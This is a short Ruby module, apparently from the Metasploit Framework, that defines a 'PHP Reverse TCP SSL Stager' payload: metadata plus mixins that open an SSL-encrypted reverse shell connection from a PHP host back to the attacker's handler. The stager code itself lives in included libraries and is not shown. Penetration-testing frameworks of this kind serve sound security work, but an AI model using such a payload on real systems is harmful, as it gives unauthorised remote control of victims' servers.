##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/core/payload/php/reverse_tcp_ssl'

module MetasploitModule

  CachedSize = 951

  include Msf::Payload::Stager
  include Msf::Payload::Php::ReverseTcpSsl

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Reverse TCP SSL Stager',
      'Description'   => 'Reverse PHP connect back stager with checks for disabled functions and SSL encryption',
      'Author'        => ['RageLtMan <rageltman[at]sempervictus>'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Stager'        => {'Payload' => ""}
      ))
  end

end
